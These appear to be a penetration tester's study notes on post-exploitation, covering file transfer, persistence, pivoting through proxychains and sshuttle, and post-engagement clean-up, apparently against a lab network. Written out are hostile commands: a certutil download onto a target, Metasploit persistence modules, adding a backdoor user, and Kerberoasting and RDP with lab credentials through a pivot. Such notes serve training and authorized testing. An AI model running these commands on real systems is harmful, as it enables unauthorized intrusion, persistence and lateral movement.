## POST!  
### File Transfer Review
#### Certutil  
certutil.exe -urlcache -f http://192.168.176.129/file.txt file.txt   
#### HTTP  
python -m SimpleHTTPServer 80  
#### FTP 
python -m pyftpdlib 21  
ftp 192.168.176.129  
#### LINUX 
wget   
#### Metasploit
upload download file feature from session  
***  
### Maintaining Access Overview  
Persistence is dangerous and not normally needed for pentest.. typically RED TEAM function  
run persistence -h  
exploit/windows/local/persistence  
exploit/windows/local/registry_persistence  
#### Scheduled Tasks  
run scheduleme  
run schtaskabuse    
#### Add a user
net user hacker password123 /add  
***  
### Pivoting  
cat /etc/proxychains4.conf  
identify socks port, `socks4 127.0.0.1 9050`  

`ssh -f -N -D 9050 -i pivot root@10.10.155.5`  
-f : background SSH  
-N : do not execute remote commands, great for port forwarding   
-D : where to bind port  
to use, use following syntax  

nmap through proxychains pivot, to another remote network  
`proxychains nmap 10.10.10.225`  
kerberoast through pivot  
`proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.176.121 -request`   
RDP through proxychains  
`proxychains xfreerdp /u:administrator /p:'hacker321!' /v:10.10.10.225`  
run firefox with proxychains, to browse websites on remote pivot network  
`proxychains firefox`  

#### Pivot with sshuttle  
install with `sudo pip install sshuttle`  
`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`
as long as this shuttle/ssh connection is active,  you'll be able to access the pivoted network  
can also try 'chisel' tool   
***  
### Cleaning UP  
Make the system/network as it was when you entered it  
Remove executables, scripts, and added files  
Remove malware, rootkits, and added user accounts  
Set settings back to original configs  
***   